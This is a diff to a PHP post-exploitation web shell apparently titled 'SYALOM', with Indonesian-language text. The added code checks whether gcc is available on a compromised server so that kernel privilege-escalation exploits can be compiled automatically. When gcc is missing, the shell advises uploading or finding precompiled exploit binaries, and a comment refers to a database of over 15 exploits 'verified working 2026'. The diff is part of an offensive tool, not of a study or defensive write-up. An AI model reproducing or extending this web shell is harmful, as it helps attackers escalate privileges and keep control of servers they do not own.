@@ -2105,6 +2105,21 @@ function scan_env_variables() {
 function auto_compile_kernel_exploit($cve, $kernel_version) {
     $results = ['success' => false, 'output' => '', 'compiled_binary' => ''];
     
+    // Check if gcc is available
+    $gcc_check = execute_shell_command("which gcc 2>/dev/null || echo 'NOT_FOUND'");
+    if (strpos($gcc_check, 'NOT_FOUND') !== false) {
+        $results['output'] = "❌ GCC tidak tersedia di server ini!\n\n";
+        $results['output'] .= "Server: " . php_uname() . "\n";
+        $results['output'] .= "GCC: NOT INSTALLED\n\n";
+        $results['output'] .= "⚠️ Compile tidak dapat dilakukan.\n\n";
+        $results['output'] .= "Alternatif:\n";
+        $results['output'] .= "1. Cari pre-compiled binary exploit\n";
+        $results['output'] .= "2. Upload binary dari mesin lain (same arch)\n";
+        $results['output'] .= "3. Gunakan metode privilege escalation lain\n\n";
+        $results['output'] .= "Architecture: " . php_uname('m') . "\n";
+        return $results;
+    }
+    
     // 🔥 EXTENSIVE AUTO-COMPILE DATABASE - 15+ Exploits
     // URL diperbarui - verified working 2026
     $exploit_db = [
@@ -3286,7 +3301,7 @@ function list_dir($path) {
 <body>
 <div class="container">
     <div class="menu-panel">
-        <h1>::S Y A L O M:: ~ 280326 2108</h1>
+        <h1>::S Y A L O M - 𝒮𝒜𝑀𝐵𝒪:: ~ 280326 2112</h1>
         <!-- Quick Actions Row -->
         <div class="section">
             <h3>⚡ Quick Actions</h3>
